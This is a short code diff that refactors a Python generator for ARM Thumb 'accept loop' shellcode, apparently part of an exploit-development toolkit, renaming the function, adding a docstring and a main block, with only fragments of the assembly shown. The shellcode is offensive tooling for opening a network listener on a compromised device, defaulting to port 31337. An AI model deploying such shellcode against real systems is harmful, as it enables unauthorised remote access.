@@ -1,6 +1,18 @@
 # acceptloop(port)
-def ARM_THUMB_ACCEPTLOOP(port=31337):
-    sc = """
+
+import socket
+
+def generate(port=31337):
+    """accept loop shellcode in Thumb Mode
+    
+    argument:
+        port (int/str): specific port
+
+    return:
+        shellcode string in .s style
+    """
+
+    sc = '''
     mov r0, #2
     mov r1, #1
     sub r2, r2, r2
@@ -66,5 +78,8 @@ cleanup_3:
     b looplabel_2
 
 after_fork_4:
-    """ % (ntohs(port))
+    ''' % (socket.ntohs(port))
     return sc
+
+if __name__ == '__main__':
+    print generate()
